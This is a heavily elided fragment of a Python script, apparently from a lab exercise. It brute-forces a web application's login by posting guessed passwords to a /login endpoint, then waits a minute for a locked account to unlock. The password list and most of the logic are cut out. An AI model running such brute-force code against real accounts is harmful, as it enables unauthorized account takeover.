...
def bruteforce_password(url, session, username):
    passwords = [
...
def login(url, session, username, password):
    response = session.post(f"{url}/login", data={"username": username, "password": password}, allow_redirects=False, timeout=10)
...
def main():
    ...
    try:
        ...
        password = bruteforce_password(url, session, username)
        if password:
        ...
        print("(+) Waiting 1 minute for the account to unlock before logging in...")
        sleep(60)
